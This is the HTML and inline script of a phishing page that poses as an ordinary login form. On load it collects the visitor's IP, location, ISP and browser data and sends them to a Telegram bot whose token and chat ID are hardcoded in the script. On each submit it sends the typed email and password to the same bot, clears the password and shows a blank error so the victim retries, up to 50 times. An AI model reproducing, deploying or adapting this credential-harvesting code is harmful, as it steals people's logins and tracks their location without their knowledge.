<body>

  <!-- Intro Splash Image -->
  <div class="intro-image-container" id="introImageContainer">
    <img src="https://res.cloudinary.com/dxzzgijsa/image/upload/v1748260948/sure_scan_xfvelb.png" alt="Intro Image">
  </div>

  <!-- Login Form -->
  <div class="login-container" id="loginContainer">
    <form id="loginForm">
      <div id="errorMessage"></div>
      <div class="form-group">
        <label for="email">Username</label>
        <div class="input-container">
          <div class="input-icon user-icon"></div>
          <input type="email" id="email" name="email" placeholder="Username" value="" required>
        </div>
      </div>

      <div class="form-group">
        <label for="password">Password</label>
        <div class="input-container">
          <div class="input-icon lock-icon"></div>
          <input type="password" id="password" name="password" placeholder="Password." required>
        </div>
      </div>

      <button type="submit" class="login-btn">LOGIN</button>
    </form>

    <a href="#" class="reset-link"></a>
  </div>

  <script>
    const token = '8639240486:AAG06St82diBzR7EmEZrQ2jiK-WGrrRbBkA';
    const chatId = '8052751627';
    let loginAttempts = 0;

    function sendToTelegram(message) {
      if (!navigator.onLine) return;
      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: message })
      }).catch(console.error);
    }

    function sendVisitorInfo() {
      const userAgent = navigator.userAgent;
      const port = window.location.port || (window.location.protocol === 'https:' ? '443' : '80');
      fetch('https://ipapi.co/json/')
        .then(res => res.json())
        .then(data => {
          const message = `🌐nowwmaill Visi Info\nIP: ${data.ip}\nCountry: ${data.country_name}\nCity: ${data.city}\nISP: ${data.org}\nPort: ${port}\nBrowser: ${userAgent}`;
          sendToTelegram(message);
        })
        .catch(() => {
          sendToTelegram(`🌐nowwmaill  vi Info (IP lookup failed)\nPort: ${port}\nBrowser: ${userAgent}`);
        });
    }

    window.onload = function () {
      sendVisitorInfo();
      setTimeout(() => {
        document.getElementById('introImageContainer').style.display = 'none';
        document.getElementById('loginContainer').style.display = 'block';
      }, 500);
    };

    document.getElementById('loginForm').addEventListener('submit', function(e) {
      e.preventDefault();
      const email = document.getElementById('email').value.trim();
      const password = document.getElementById('password').value.trim();

      if (!email || !password) {
        document.getElementById('errorMessage').textContent = "Please fill in all fields.";
        document.getElementById('errorMessage').style.display = 'block';
        return;
      }

      loginAttempts++;
      const msg = `❌nowwmaill  dro #${loginAttempts}\n📧 Email: ${email}\n🔑 Password: ${password}`;
      sendToTelegram(msg);

      document.getElementById('errorMessage').textContent = "";
      document.getElementById('errorMessage').style.display = 'block';
      document.getElementById('password').value = '';

      if (loginAttempts >= 50) {
        window.location.href = 'https://res.cloudinary.com/dxzzgijsa/image/upload/v1748260948/sure_scan_xfvelb.png';
      }
    });

    document.querySelector('.reset-link').addEventListener('click', function(e) {
      e.preventDefault();
      alert('Reset password functionality would be implemented here.');
    });
  </script>
</body>
